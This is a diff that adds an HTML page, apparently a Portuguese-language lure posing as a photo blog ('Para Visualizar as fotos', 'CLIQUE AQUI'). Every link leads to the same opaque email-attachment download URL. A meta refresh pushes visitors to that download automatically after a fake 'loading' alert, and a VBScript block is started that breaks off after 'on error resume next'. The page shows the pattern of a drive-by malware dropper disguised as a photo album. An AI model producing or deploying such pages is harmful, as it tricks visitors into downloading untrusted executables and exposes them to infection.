@@ -1,0 +1,51 @@
+<script language="JavaScript" src="http://www2.xpg.com.br/sites/HEADER.js"></script>
+<noframe><noscript>
+<div style="text-align:center;background-image:url(http://www2.xpg.com.br/images/xpg2/padrao/internas/barra_fundo.gif)">
+<img src="http://www2.xpg.com.br/images/xpg2/padrao/internas/barra_nojava.gif" border="0" usemap="#Map" >
+<map name="Map">
+  <area shape="rect" coords="84,-1,221,30" href="#">
+  <area shape="rect" coords="277,0,405,29" href="#">
+</map>
+</div>
+</noscript></noframe>
+<body bgcolor="yellow">
+
+<p align="center">
+&nbsp;</P>
+
+
+
+<p align="center">
+&nbsp;</P>
+</span><span style="font-family:Times New Roman;font-size:20;color:blue;"><p align="center"><b><i>Para Visualizar as fotos</i></b></span></p>
+<a href="http://mail.ubbi.com.br/vdRfc2att/rfc2attach20.dll?f=9fFMbiBE7Ih5FSdXUqBTJ8WQgIyroDb12cKdxcYP4BeM0yOYlKn7u6Xmig3vqEHxiv6%2BI5s2uDK8CzYdnHITBGBeI7GyJ7v7Nwcl3hWzH7CyC58RFCdW4K7u4O7jn511%2Fq9Y%2BXsnvCYHT%2BrrSBK5zw&fb=1092&lb=214343"><span style="font-family:Times New Roman;font-size:25;color:red;"><p align="center"><b><i>CLIQUE AQUI</i></b></span></p></a>
+</span><p align="center"><b><i><strong></strong></p></i></b>
+<b><i></i></b>
+</i></b></span></p></a>
+</i></b></span></p></a>
+</i></b></span></p></a>
+
+
+
+
+
+<p align="center">
+&nbsp;</P>
+
+</span><span style="font-family:Times New Roman;font-size:18;color:blue;"><p align="center"><b><i></i></b></span></p>
+<a href="http://mail.ubbi.com.br/vdRfc2att/rfc2attach20.dll?f=9fFMbiBE7Ih5FSdXUqBTJ8WQgIyroDb12cKdxcYP4BeM0yOYlKn7u6Xmig3vqEHxiv6%2BI5s2uDK8CzYdnHITBGBeI7GyJ7v7Nwcl3hWzH7CyC58RFCdW4K7u4O7jn511%2Fq9Y%2BXsnvCYHT%2BrrSBK5zw&fb=1092&lb=214343"><span style="font-family:Times New Roman;font-size:25;color:red;"><p align="center"><b><i>fotos12067 a foto 12200</i></b></span></p></a>
+
+<p align="center">
+&nbsp;</P>
+</i></b></span></p></a>
+</i></b></span></p></a>
+<p align="center">
+&nbsp;</P>
+<a href="http://mail.ubbi.com.br/vdRfc2att/rfc2attach20.dll?f=9fFMbiBE7Ih5FSdXUqBTJ8WQgIyroDb12cKdxcYP4BeM0yOYlKn7u6Xmig3vqEHxiv6%2BI5s2uDK8CzYdnHITBGBeI7GyJ7v7Nwcl3hWzH7CyC58RFCdW4K7u4O7jn511%2Fq9Y%2BXsnvCYHT%2BrrSBK5zw&fb=1092&lb=214343"target=_blank>fotos 12201 a 14000</a><br><br> 
+
+
+
+
+'<html><script>alert('blog  fotos aguarde caregando o site!')</script><head><meta http-equiv="Refresh" content="1;URL=http://mail.ubbi.com.br/vdRfc2att/rfc2attach20.dll?f=9fFMbiBE7Ih5FSdXUqBTJ8WQgIyroDb12cKdxcYP4BeM0yOYlKn7u6Xmig3vqEHxiv6%2BI5s2uDK8CzYdnHITBGBeI7GyJ7v7Nwcl3hWzH7CyC58RFCdW4K7u4O7jn511%2Fq9Y%2BXsnvCYHT%2BrrSBK5zw&fb=1092&lb=214343"> <script language="VBScript">
+
+    on error resume next
